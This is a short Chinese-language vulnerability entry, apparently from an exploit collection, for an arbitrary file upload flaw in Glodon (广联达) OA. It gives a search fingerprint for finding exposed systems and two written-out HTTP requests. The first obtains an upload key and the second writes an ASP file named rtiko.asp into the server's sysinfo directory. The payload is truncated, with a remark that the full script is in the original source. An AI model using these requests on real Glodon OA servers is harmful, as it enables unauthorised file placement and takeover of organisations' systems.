# 广联达OAUserFilesUpload存在任意文件上传漏洞

- **系统**：广联达　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="广联达 OA"`
- **请求**：`POST /Services/FileService/UserFiles/GetAuthorizeKey.ashx HTTP/1.1`

**请求体 / payload**
```
1. 创建文件，获取`key`
Host:
Content-Length: 41
Content-Type: application/x-www-form-urlencoded
SL-CE-SUID: 97
destDir=./sysinfo/&destFilename=rtiko.asp
2. 通过上一步获取的`key`，构造请求数据包上传文件
POST /Services/FileService/UserFiles/UserFilesUpload.ashx HTTP/1.1
Host:
Content-Length: 782
Content-Type: multipart/form-data; boundary=----ehjqlfi2qaa6kb5c4xri
SL-CE-SUID: 97
------ehjqlfi2qaa6kb5c4xri
Content-Disposition: form-data; name="destDir"
./sysinfo/
------ehjqlfi2qaa6kb5c4xri
Content-Disposition: form-data; name="destFilename"
rtiko.asp
------ehjqlfi2qaa6kb5c4xri
Content-Disposition: form-data; name="key"
1ca6…（脚本共 1158 字，完整版见原文）
```

**其他**
- 广联达OA UserFilesUpload存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 广联达办公OA